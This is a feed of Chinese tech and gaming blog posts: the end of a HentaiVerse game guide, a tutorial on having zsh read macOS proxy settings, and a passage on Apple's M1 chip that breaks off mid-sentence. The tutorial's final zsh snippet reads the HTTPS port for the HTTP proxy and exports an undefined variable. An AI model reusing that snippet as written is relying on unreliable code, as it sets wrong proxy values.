药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\">\n<div class=\"license-title\">[译] HentaiVerse 建议和指导</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-12-24</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\">\n<div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-12-07</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 